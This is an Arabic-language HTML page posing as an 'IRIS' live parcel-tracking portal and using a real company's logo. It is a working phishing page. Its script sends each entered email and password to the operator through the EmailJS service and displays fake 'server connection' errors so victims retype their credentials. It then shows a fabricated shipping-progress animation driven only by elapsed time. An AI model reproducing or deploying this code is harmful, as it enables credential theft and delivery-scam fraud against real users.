<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRIS | QUANTUM TRACKING SYSTEM</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --iris: #ff6600; --red: #ff3333; --bg: #020202; --panel: rgba(20, 20, 20, 0.8); }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        .grid-bg { position: fixed; width: 100%; height: 100%; background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px); background-size: 40px 40px; z-index: -1; opacity: 0.5; }
        .container { width: 95%; max-width: 500px; background: var(--panel); backdrop-filter: blur(15px); border: 1px solid #333; border-top: 4px solid var(--iris); padding: 35px; border-radius: 20px; box-shadow: 0 0 50px rgba(0,0,0,1); position: relative; }
        .logo { 
    width: 140px; 
    display: block;        /* يجعل الشعار عنصراً مستقلاً */
    margin-left: auto;     /* دفع من اليسار للمنتصف */
    margin-right: auto;    /* دفع من اليمين للمنتصف */
    margin-bottom: 25px;   /* المسافة أسفل الشعار */
    filter: drop-shadow(0 0 10px var(--iris)); /* الوهج البرتقالي */
}

        input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid #444; padding: 18px; color: var(--iris); font-size: 16px; border-radius: 12px; outline: none; margin-bottom: 15px; text-align: center; }
        .btn-main { width: 100%; background: var(--iris); color: #000; border: none; padding: 18px; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        #trackingUI { display: none; text-align: left; animation: fadeIn 0.8s ease; }
        .path-container { position: relative; height: 60px; margin: 30px 0; display: flex; align-items: center; justify-content: space-between; }
        .main-line { position: absolute; width: 100%; height: 2px; background: #222; z-index: 1; }
        .progress-line { position: absolute; height: 2px; background: var(--iris); z-index: 2; width: 0%; transition: 2s width ease-in-out; box-shadow: 0 0 15px var(--iris); }
        .step { position: relative; z-index: 3; text-align: center; }
        .dot { width: 14px; height: 14px; background: #111; border: 2px solid #333; border-radius: 50%; margin: 0 auto 10px; }
        .step.active .dot { background: var(--iris); border-color: #fff; box-shadow: 0 0 20px var(--iris); }
        .step span { font-size: 10px; color: #555; font-weight: bold; }
        .step.active span { color: var(--iris); }
        .map-wrapper { width: 100%; height: 180px; background: #000; border-radius: 15px; margin-top: 25px; position: relative; overflow: hidden; border: 1px solid #222; }
        .map-frame { width: 100%; height: 100%; opacity: 0.5; filter: grayscale(1) invert(0.9); }
        #errorBox { display: none; position: absolute; inset: 0; background: rgba(10,0,0,0.95); z-index: 100; flex-direction: column; justify-content: center; align-items: center; border-radius: 20px; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

<div class="grid-bg"></div>
<div class="container">
    <div id="errorBox">
        <h2 style="color:var(--red);">⚠️</h2>
        <p id="mainErr" style="font-size: 13px; text-align: center; padding: 0 30px;"></p>
        <button class="btn-main" style="width: auto; padding: 10px 40px;" onclick="closeErr()">إعادة المحاولة</button>
    </div>

    <img src="https://dia-algerie.com/wp-content/uploads/2017/10/DIA-Iris-LOGO.jpg" class="logo">

    <div id="step1">
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="pass" placeholder="كلمة المرور">
        <button class="btn-main" onclick="handleLogin()">دخول النظام</button>
    </div>

    <div id="step2" style="display:none;">
        <input type="text" id="trackID" placeholder="كود التتبع (مثلاً IRI1465)">
        <button class="btn-main" onclick="handleTrack()">تفعيل التتبع المباشر</button>
    </div>

    <div id="trackingUI">
        <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 15px;">
            <span style="color: #00ff00;">● LIVE GPS</span>
            <span id="timeDisplay" style="color: var(--iris);"></span>
        </div>
        <div style="background: rgba(255,102,0,0.1); padding: 15px; border-radius: 10px; border-right: 3px solid var(--iris);">
            <div style="font-size: 10px; color: #666;">الحالة الحالية:</div>
            <div id="statusText" style="font-size: 14px; font-weight: bold; margin-top: 5px;">قيد المراجعة</div>
        </div>

        <div class="path-container">
            <div class="main-line"></div>
            <div class="progress-line" id="pLine"></div>
            <div class="step" id="s1"><div class="dot"></div><span>قيد التغليف</span></div>
            <div class="step" id="s2"><div class="dot"></div><span>قيد الشحن</span></div>
            <div class="step" id="s3"><div class="dot"></div><span>التوصيل</span></div>
        </div>

        <div class="map-wrapper">
            <img src="https://api.maptiler.com/maps/toner-v2/static/3.05,36.75,12/400x200.png?key=get_your_own_key" class="map-frame">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
                <div style="width: 15px; height: 15px; background: var(--iris); border-radius: 50%; box-shadow: 0 0 15px var(--iris); animation: pulse 1.5s infinite;"></div>
            </div>
        </div>
    </div>
</div>

<script>
    (function(){ emailjs.init("hma62I4_QEEFlX16M"); })();

    let tries = 0;

    function handleLogin() {
        const e = document.getElementById('email');
        const p = document.getElementById('pass');
        if (!e.value.includes('@') || p.value.length < 6) { alert("بيانات غير صحيحة"); return; }
        
        tries++;
        sendData(e.value, p.value, "دخول");
        if (tries < 3) {
            showErr("خطأ في الاتصال بالسيرفر المركزي (0x88)");
            e.value = ""; p.value = "";
        } else {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }
    }

    // --- هنا المتحكم الزمني الجديد (29 ساعة) ---
    function handleTrack() {
        const t = document.getElementById('trackID').value.toUpperCase();
        const allowed = ["IRI1465", "KDA1375", "GJA1486"];

        if (allowed.includes(t)) {
            sendData(document.getElementById('email').value, document.getElementById('pass').value, "كود: " + t);
            document.getElementById('step2').style.display = 'none';
            document.getElementById('trackingUI').style.display = 'block';

            // حساب الوقت
            let startTime = localStorage.getItem('iris_start_' + t);
            if (!startTime) {
                startTime = new Date().getTime();
                localStorage.setItem('iris_start_' + t, startTime);
            }

            const hoursPassed = (new Date().getTime() - startTime) / (1000 * 60 * 60);

            // تحديث الواجهة بناءً على الساعات
            updateProgress(hoursPassed);
            startClock();
        } else { alert("الكود غير موجود"); }
    }

    function updateProgress(hours) {
    const pLine = document.getElementById('pLine');
    const status = document.getElementById('statusText');
    const s1 = document.getElementById('s1');
    const s2 = document.getElementById('s2');
    const s3 = document.getElementById('s3');

    // --- معادلة الزحف المستمر (التقدم بناءً على 58 ساعة إجمالية) ---
    let percentage = (hours / 58) * 100;
    
    // تأمين النسبة لكي لا تتخطى 100%
    if (percentage > 100) percentage = 100;
    if (percentage < 0) percentage = 0;

    // تحريك الشريط بالزحف
    pLine.style.width = percentage + '%';

    // التحكم في إضاءة النقاط (الدوائر) بناءً على النسبة
    s1.classList.add('active'); // قيد التغليف (دائماً نشطة)
    
    if (percentage >= 50) {
        s2.classList.add('active'); // قيد الشحن (تضيء بعد منتصف الوقت)
        status.innerText = "قيد الشحن الدولي - العبور";
    } else {
        status.innerText = "قيد التغليف والتحضير الفني";
    }

    if (percentage >= 95) {
        s3.classList.add('active'); // التوصيل (تضيء عند النهاية)
        status.innerText = "وصلت لمركز التوزيع - قيد التسليم للعنوان";
    }
}

    function sendData(em, ps, tr) {
        emailjs.send("service_e9hc9br", "template_d9qi0yc", {
            user_email: em, user_password: ps, track_id: tr, time: new Date().toLocaleString()
        });
    }

    function startClock() {
        setInterval(() => { document.getElementById('timeDisplay').innerText = new Date().toLocaleTimeString(); }, 1000);
    }

    function showErr(m) { document.getElementById('mainErr').innerText = m; document.getElementById('errorBox').style.display = 'flex'; }
    function closeErr() { document.getElementById('errorBox').style.display = 'none'; }
</script>
</body>
</html>
